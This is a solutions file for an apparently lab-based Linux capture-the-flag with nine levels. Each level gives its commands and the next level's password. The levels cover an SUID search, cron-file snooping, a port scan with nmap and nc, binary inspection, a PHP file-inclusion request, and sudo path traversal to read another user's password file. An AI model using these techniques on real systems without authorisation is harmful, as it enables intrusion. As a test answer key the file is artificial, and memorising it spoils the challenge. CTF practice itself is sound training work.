# CTF Challenge Solutions

This document contains solutions to all CTF levels for administrators.

## Level 0 (Demo)
- Simply read the README.txt file:
  ```bash
  cat README.txt
  ```
- Password for Level 1: `bacon_pancakes`

## Level 1: Hidden Files
- Find hidden files in the home directory:
  ```bash
  ls -la
  cat .hidden_password
  ```
- Password for Level 2: `turkey_sandwich`

## Level 2: File Permissions and SUID
- Look for files with SUID bit set:
  ```bash
  find / -perm -4000 -user bandit3 2>/dev/null
  /home/bandit2/read_password
  ```
- Run the binary to get the password:
  ```bash
  ./read_password
  ```
- Password for Level 3: `electric_keyboard`

## Level 3: Scheduled Tasks
- Check for scheduled jobs:
  ```bash
  cat /etc/cron.d/bandit3_task
  ```
- Monitor /tmp for the password file:
  ```bash
  watch -n 1 ls -la /tmp
  ```
- Once it appears:
  ```bash
  cat /tmp/password_drop
  ```
- Password for Level 4: `dancing_monkey`

## Level 4: Network Services
- Scan for open ports:
  ```bash
  nmap -p 1-65535 localhost
  ```
- Connect to the service on port 54321:
  ```bash
  nc localhost 54321
  ```
- Password for Level 5: `rubber_chicken`

## Level 5: Binary Analysis
- Analyze the binary to find the secret code:
  ```bash
  strings checker
  ```
- Or use a debugger:
  ```bash
  gdb -q checker
  ```
- Run the binary with the secret code:
  ```bash
  ./checker
  # Enter: open_sesame
  ```
- Password for Level 6: `flying_squirrel`

## Level 6: Web Exploitation
- Exploit the PHP file inclusion vulnerability:
  ```bash
  curl "http://localhost/level6.php?file=/var/www/html/secret/passwd.txt"
  ```
- Password for Level 7: `flying_lemur`

## Level 7: Privilege Escalation
- Check sudo privileges:
  ```bash
  sudo -l
  ```
- Use path traversal to access the password file:
  ```bash
  sudo -u bandit8 /usr/bin/cat /home/bandit7/not_here/../../../home/bandit8/.password
  ```
- Password for Level 8: `underwater_basket`

## Level 8: Steganography and Forensics (Bonus)
- Find the secret message:
  ```bash
  cat /home/bandit8/challenge/secret_message.txt
  cat /home/bandit8/challenge/hint.txt
  ```
- Final master password: `golden_trophy`
